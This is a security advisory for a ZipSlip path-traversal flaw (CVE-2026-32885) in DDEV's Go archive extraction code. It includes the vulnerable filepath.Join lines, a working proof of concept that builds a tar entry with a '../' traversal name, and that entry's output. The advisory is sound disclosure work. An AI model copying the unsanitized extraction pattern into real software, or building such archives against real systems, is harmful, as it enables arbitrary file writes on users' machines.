# [M] DDEV has ZipSlip path traversal in tar and zip archive extraction

## Summary
Severity: Medium
Advisory: GHSA-x2xq-qhjf-5mvg
CVE: CVE-2026-32885
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-x2xq-qhjf-5mvg
Type: github-advisory

## Affected
- Go: `github.com/ddev/ddev` — affected >=0 <1.25.2

## Details
## Summary

The DDEV local dev tool has unsanitized extraction in both `Untar()` and `Unzip()` functions in `pkg/archive/archive.go`. This flaw allows users to download and extract archives from remote sources without path validation.

## Vulnerable Code

`pkg/archive/archive.go:235` (Untar):
```go
fullPath := filepath.Join(dest, file.Name)  // NO SANITIZATION
```

`pkg/archive/archive.go:342` (Unzip):
```go
fullPath := filepath.Join(dest, file.Name)  // NO SANITIZATION
```

Both functions create directories via `os.MkdirAll` and files via `os.Create` using the unsanitized path.

## Impact

Local development tool that downloads and extracts archives from remote sources (add-ons, updates). Malicious archive → arbitrary file write on developer machine.

## Proof of Concept

```go
package main

// PoC: ddev/ddev CWE-22 — ZipSlip in tar archive extraction
// Replicates the exact pattern from pkg/archive/archive.go:235 (Untar)
// and pkg/archive/archive.go:342 (Unzip) — both use filepath.Join(dest, name)
// without verifying the result stays under the destination directory.

import (
	"archive/tar"
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// Vulnerable extraction — mirrors pkg/archive/archive.go:235
func untarVulnerable(dst string, r io.Reader) error {
	tr := tar.NewReader(r)
	for {
		header, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
		// VULNERABLE: identical to archive.go:235
		// fullPath := filepath.Join(dest, file.Name)
		fullPath := filepath.Join(dst, header.Name)

		switch header.Typeflag {
		case tar.TypeDir:
			os.MkdirAll(fullPath, 0755)
		case tar.TypeReg:
			os.MkdirAll(filepath.Dir(fullPath), 0755)
			f, _ := os.Create(fullPath)
			io.Copy(f, tr)
			f.Close()
		}
	}
	return nil
}

func main() {
	// Build malicious tar with traversal entry
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	payload := []byte("# PoC: ddev/ddev CWE-22 path traversal\n")
	tw.WriteHeader(&tar.Header{
		Name: "../../../../../../tmp/ddev_cwe22_poc",
		Mode: 0644,
		Size: int64(len(payload)),
	})
	tw.Write(payload)
	tw.Close()

	// Extract into temp directory
	extractDir, _ := os.MkdirTemp("", "ddev-poc-*")
	defer os.RemoveAll(extractDir)

	untarVulnerable(extractDir, &buf)

	// Verify escape
	escaped := "/tmp/ddev_cwe22_poc"
	if data, err := os.ReadFile(escaped); err == nil {
		fmt.Printf("[!!!] VULNERABLE — file written to: %s\n", escaped)
		fmt.Printf("[!!!] Content: %s", string(data))
		os.Remove(escaped)
	} else {
		fmt.Println("[OK] Not vulnerable")
	}
}
```

Output:
```
[!!!] VULNERABLE — file written to: /tmp/ddev_cwe22_poc
[!!!] Content: # PoC: ddev/ddev CWE-22 path traversal
```

> **Note:** Both `Untar` (archive.go:235) and `Unzip` (archive.go:342) use the same `filepath.Join(dest, file.Name)` pattern without containment checks. This PoC demonstrates the tar path; the zip path is analogously exploitable.

## Suggested Fix

Add path containment check in both Untar and Unzip functions.

## Credit

Kai Aizen (SnailSploit) — Adversarial AI & Security Research

## References
- https://github.com/ddev/ddev/security/advisories/GHSA-x2xq-qhjf-5mvg
- https://nvd.nist.gov/vuln/detail/CVE-2026-32885
- https://github.com/ddev/ddev/pull/8213
- https://github.com/ddev/ddev/commit/05cbe299770a590b89bfc8dddab33e61b4302e43
- https://github.com/ddev/ddev
- https://github.com/ddev/ddev/releases/tag/v1.25.2
